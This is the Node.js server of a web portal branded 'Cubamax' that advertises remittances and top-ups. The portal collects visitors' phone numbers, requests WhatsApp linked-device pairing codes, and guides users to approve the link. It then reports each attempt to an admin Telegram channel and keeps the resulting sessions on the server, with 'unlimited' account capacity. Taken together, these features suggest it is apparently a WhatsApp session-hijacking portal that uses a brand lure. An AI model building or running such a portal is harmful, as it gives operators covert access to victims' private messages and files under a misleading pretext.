import {portalContent,portalMediaPath} from './portal.js';
import {webPhone,phoneParts} from './identity.js';
import http from 'node:http';
import { readFileSync } from 'node:fs';
import { Store } from './store.js';
import { Accounts } from './whatsapp.js';
import { BaileysStore } from './baileys-store.js';
import { Telegram } from './telegram.js';
import { guides, mediaPath, cleanupGuideMedia } from './guides.js';
import path from 'node:path';
const dir=process.env.DATA_DIR||'./data',store=new Store(dir);
const url=(process.env.PUBLIC_URL||process.env.RENDER_EXTERNAL_URL||'http://localhost:10000').replace(/\/$/,'');
const secure=url.startsWith('https://');
const panel=process.env.CHATS||process.env.ADMIN_CHAT_ID;
const telegram=new Telegram(store,{token:process.env.TOKEN,admins:process.env.ADMIN_IDS,panel,storage:process.env.ALMACEN,url});
const accounts=new Accounts(store,dir,(...args)=>telegram.notify(...args));telegram.accounts=accounts;
console.log('WHATSAPP: account_capacity','unlimited');
console.log('WHATSAPP: transport_default',process.env.WA_ENGINE||'baileys');
const defaults={title:'Tu WhatsApp, bien atendido.',description:'Conecta tu cuenta para que nuestro equipo te ayude a gestionar tus conversaciones y archivos.',button:'CONECTAR CUENTA',color:'#128c7e'};
const security={
  'Content-Security-Policy':"default-src 'self'; img-src 'self' data:; script-src 'self'; style-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'",
  'X-Content-Type-Options':'nosniff','Referrer-Policy':'no-referrer','X-Frame-Options':'DENY','Cache-Control':'no-store',
  ...(secure?{'Strict-Transport-Security':'max-age=31536000'}:{})
};
const publicFiles={'/cubamax':['cubamax.html','text/html; charset=utf-8'],'/cubamax/':['cubamax.html','text/html; charset=utf-8'],'/cubamax.css':['cubamax.css','text/css'],'/cubamax.js':['cubamax.js','application/javascript'],'/cubamax-headline.js':['cubamax-headline.js','application/javascript'],'/cubamax-logo.svg':['cubamax-logo.svg','image/svg+xml'],'/countries.js':['countries.js','application/javascript'],'/favicon.svg':['favicon.svg','image/svg+xml'],'/':['index.html','text/html; charset=utf-8'],'/app.js':['app.js','application/javascript'],'/style.css':['style.css','text/css']};
async function body(req){let data='';for await(const chunk of req){data+=chunk;if(data.length>4000)throw new Error('Solicitud demasiado grande');}return JSON.parse(data||'{}');}
const rates=new Map();
function rate(key,max){const now=Date.now();let r=rates.get(key);if(!r||now-r.since>60000){r={since:now,n:0};rates.set(key,r);}return ++r.n<=max;}
const server=http.createServer(async(req,res)=>{
  const route=new URL(req.url,'http://local').pathname;
  const sessionCookie=req.headers['x-portal']==='cubamax-corporate'?'cubamax_session':'wa_session';
  const json=(status,data,extra={})=>{res.writeHead(status,{...security,'Content-Type':'application/json',...extra});res.end(JSON.stringify(data));};
  try{
    if(req.method==='GET'&&publicFiles[route]){
      const [file,type]=publicFiles[route];res.writeHead(200,{...security,'Content-Type':type});return res.end(readFileSync(new URL(`../public/${file}`,import.meta.url)));
    }
    if(req.method==='GET'&&route==='/health')return json(200,{ok:true,service:'WHATSAPP',transport:process.env.WA_ENGINE||'baileys'});
    if(req.method==='GET'&&route==='/api/cubamax')return json(200,portalContent(store));
    if(req.method==='GET'&&/^\/cubamax-services\/(shein|remesas|recargas|supercombo)\.webp$/.test(route)){const bytes=readFileSync(new URL('../public'+route,import.meta.url));res.writeHead(200,{...security,'Content-Type':'image/webp','Content-Length':bytes.length});return res.end(bytes);}
    if(req.method==='GET'&&/^\/cubamax-promos\/(remesas|ecoflow|bicicleta|contacto|carga|moto|equipo|grupo)\.webp$/.test(route)){const bytes=readFileSync(new URL('../public'+route,import.meta.url));res.writeHead(200,{...security,'Content-Type':'image/webp','Content-Length':bytes.length});return res.end(bytes);}
    if(req.method==='GET'&&/^\/cubamax-slides\/(money|combo|packages|topup)\.svg$/.test(route)){res.writeHead(200,{...security,'Content-Type':'image/svg+xml'});return res.end(readFileSync(new URL('../public'+route,import.meta.url)));}
    if(req.method==='GET'&&portalMediaPath.test(route)){try{const data=readFileSync(path.join(dir,'portal-media',path.basename(route)));return res.writeHead(200,{...security,'Content-Type':{png:'image/png',jpg:'image/jpeg',gif:'image/gif',webp:'image/webp'}[route.split('.').at(-1)]}),res.end(data);}catch{return json(404,{error:'Imagen no encontrada.'});}}
    if(req.method==='GET'&&route==='/api/guides')return json(200,{android:guides(store,'android'),iphone:guides(store,'iphone')});
    if(req.method==='GET'&&(/^\/guides\/(android|iphone)-(prepare|open|linked|number|approve)\.svg$/.test(route)||/^\/guides\/(android|iphone)-2026\/step-[1-5]\.gif$/.test(route)||mediaPath.test(route))){
      const ext=route.split('.').at(-1),types={svg:'image/svg+xml',png:'image/png',jpg:'image/jpeg',gif:'image/gif',webp:'image/webp',mp4:'video/mp4'};
      try{const bytes=readFileSync(route.startsWith('/guides/')?new URL('../public'+route,import.meta.url):path.join(dir,'guide-media',path.basename(route)));
        res.writeHead(200,{...security,'Content-Type':types[ext],'Content-Length':bytes.length});return res.end(bytes);
      }catch{return json(404,{error:'Imagen no encontrada'});}
    }
    if(req.method==='GET'&&route==='/api/branding'){
      const config=store.config();return json(200,{...defaults,...Object.fromEntries(['title','description','button','color','logo'].filter(k=>config[k]).map(k=>[k,config[k]]))});
    }
    if(!route.startsWith('/api/'))return json(404,{error:'No encontrado'});
    if(req.method==='POST'&&req.headers.origin!==url)return json(403,{error:'Origen inválido'});
    const ip=req.socket.remoteAddress||'unknown';if(!rate(ip,300))return json(429,{error:'Espera un minuto.'});
    if(req.method==='POST'&&route==='/api/access'){
      if(!rate(`${ip}:access`,30))return json(429,{error:'Espera un minuto.'});
      const input=await body(req);if(typeof input.token!=='string'||input.token.length>100)return json(400,{error:'Enlace inválido.'});
      const session=store.exchange(input.token);if(!session)return json(401,{error:'El acceso ha vencido o ya fue utilizado.'});
      return json(200,{ok:true},{'Set-Cookie':`${sessionCookie}=${session}; HttpOnly; SameSite=Strict; Path=/; Max-Age=2592000${secure?'; Secure':''}`});
    }
    if(req.method==='POST'&&route==='/api/register'){
      if(!rate(`${ip}:register`,5))return json(429,{error:'Espera un minuto antes de volver a intentar.'});
      const input=await body(req);
      if(input.consent!==true||typeof input.phone!=='string')return json(400,{error:'Confirma tu número y la autorización.'});
      const phone=webPhone(input),previous=store.db.prepare('SELECT * FROM accounts WHERE phone=?').get(phone);
      const unlinked=!!previous?.confirmed&&accounts.engine(previous.id)==='baileys'&&!accounts.live.get(previous.id)?.ready&&!new BaileysStore(store,previous.id).registered();
      // An enrolled number completes this public flow; it never grants account access.
      if(previous?.confirmed&&previous.consent&&!unlinked)return json(200,{ok:true,completed:true});
      if(!process.env.TOKEN||!panel||!telegram.admins().size)return json(503,{error:'Estamos preparando el servicio. Vuelve a intentarlo más tarde.'});
      const session=store.register(phone,{restartPending:true,restartUnlinked:unlinked});
      if(!session)return json(409,{error:'Este número ya tiene un acceso creado. Vuelve a abrir la página desde el teléfono y navegador donde comenzaste, o contacta con soporte.'});
      if(previous&&store.account(previous.id)?.status==='archived')await accounts.close(previous.id);
      return json(201,{ok:true},{'Set-Cookie':`${sessionCookie}=${session}; HttpOnly; SameSite=Strict; Path=/; Max-Age=2592000${secure?'; Secure':''}`});
    }
    const cookie=(req.headers.cookie||'').split(';').map(x=>x.trim()).find(x=>x.startsWith(sessionCookie+'='))?.slice(sessionCookie.length+1);
    if(req.method==='POST'&&route==='/api/browser-reset'){
      store.forgetBrowser(cookie);
      return json(200,{ok:true},{'Set-Cookie':`${sessionCookie}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${secure?'; Secure':''}`});
    }
    const a=store.browser(cookie);if(!a)return json(401,{error:'Conecta tu cuenta para continuar.'});
    if(req.method==='GET'&&route==='/api/status'){
      const e=accounts.live.get(a.id);if(a.status==='connected')store.forgetBrowser(cookie);return json(200,{name:e?.ready?(store.profile(a.id,`${a.phone}@c.us`)?.name||'Cuenta de WhatsApp'):null,phone:`+${a.phone}`,...phoneParts(a.phone),status:a.status,paused:!!a.paused,consent:!!a.consent,retryAfter:accounts.pairingRetryAfter(a.id),code:e&&e.expires>Date.now()?e.code:null,expires:e?.expires||0},a.status==='connected'?{'Set-Cookie':`${sessionCookie}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${secure?'; Secure':''}`} : {});
    }
    if(req.method==='POST'&&route==='/api/connect'){
      const input=await body(req);
      if(input.consent!==true||webPhone(input)!==a.phone)return json(400,{error:'Confirma tu número y la autorización.'});
      if(!process.env.TOKEN||!panel||!telegram.admins().size)return json(503,{error:'El administrador debe completar la configuración antes de conectar cuentas.'});
      const retryAfter=accounts.pairingRetryAfter(a.id);
      if(retryAfter)return json(429,{error:'WhatsApp limitó las solicitudes de códigos para este número. Hemos pausado los intentos durante 30 minutos para no seguir solicitando códigos.',retryAfter});
      if(!rate(`connect:${a.id}`,3))return json(429,{error:'Espera un minuto antes de volver a intentar.'});
      store.update(a.id,'consent',1);store.audit(a.id,'consent-v1');
      const corporate=input.portal==='cubamax-corporate',services={money:'Recibir dinero',combo:'Recibir combo',packages:'Recibir paquetes',topup:'Recarga móvil'};
      const corporateService=corporate?services[input.service]:null;
      if(corporate){store.setConfig(`portal:${a.id}`,'cubamax-corporate');store.audit(a.id,'corporate-consent-v1');if(corporateService)store.audit(a.id,`corporate-service:${input.service}`);}
      const current=accounts.live.get(a.id);
      // An in-flight request is reused; repeated clicks must not restart Chromium.
      await accounts.start(a.id,true);
      if(!current)await telegram.send(telegram.config.storage,`🔗 Intento de vinculación\nNúmero: +${a.phone}${corporate?'\nOrigen: Cubamax · Personal autorizado · Teléfono corporativo'+(corporateService?'\nServicio: '+corporateService:''):''}\nPendiente de confirmación en WhatsApp. Aún no es una cuenta conectada.`).catch(()=>{});
      return json(202,{ok:true});
    }
    if(req.method==='POST'&&route==='/api/pause'){
      const input=await body(req);store.update(a.id,'paused',input.paused?1:0);store.audit(a.id,input.paused?'owner_paused':'owner_resumed');return json(200,{ok:true});
    }
    if(req.method==='POST'&&route==='/api/disconnect'){
      await accounts.disconnect(a.id);return json(200,{ok:true},{'Set-Cookie':`${sessionCookie}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${secure?'; Secure':''}`});
    }
    return json(404,{error:'No encontrado'});
  }catch(e){return json(400,{error: e.message?.startsWith('Usa')||e.message?.startsWith('Se alcanzó')?e.message:'No se pudo completar la operación. Vuelve a intentarlo.'});}
});
server.listen(Number(process.env.PORT||10000),'0.0.0.0',async()=>{
  console.log('WHATSAPP: HTTP listo');
  if(process.env.TOKEN&&panel&&telegram.admins().size){
    telegram.start().catch(()=>console.error('Panel de Telegram detenido'));
    try{const destination=await telegram.api('getChat',{chat_id:telegram.config.storage});console.log('WHATSAPP: storage_verified',JSON.stringify({configured:telegram.config.storage,resolved:destination.id,type:destination.type}));}catch(error){console.error('WHATSAPP: storage_check_failed',error.code||'TG_STORAGE_CHECK');}
    await accounts.restore();
  }else console.log('WHATSAPP: falta configurar TOKEN, ADMIN_CHAT_ID y ADMIN_IDS; vinculación deshabilitada');
});
const maintenance=setInterval(()=>{
  accounts.cleanupFiles();store.cleanup();cleanupGuideMedia(store,dir);
  for(const [key,value]of rates)if(Date.now()-value.since>60000)rates.delete(key);
},3600000);maintenance.unref();
async function stop(){telegram.running=false;server.close();clearInterval(maintenance);await accounts.shutdown();store.db.close();process.exit(0);}
process.on('SIGTERM',stop);process.on('SIGINT',stop);

